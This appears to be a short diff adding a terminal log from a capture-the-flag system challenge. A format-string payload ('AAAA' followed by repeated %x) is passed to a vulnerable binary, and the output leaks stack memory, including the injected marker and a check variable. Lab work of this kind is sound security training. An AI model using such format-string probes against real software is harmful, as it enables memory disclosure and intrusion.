@@ -1,0 +1,5 @@
+app-systeme-ch14@challenge02:~$ ./ch14 "`python -c 'print "AAAA" + "%x%x%x%x%x%x%x%x%x%x"'`"
+check at 0xbffffb28
+argv[1] = [AAAA%x%x%x%x%x%x%x%x%x%x]
+fmt=[AAAAb7fdcb48101bffffc540040302014141414164663762]
+check=0x4030201
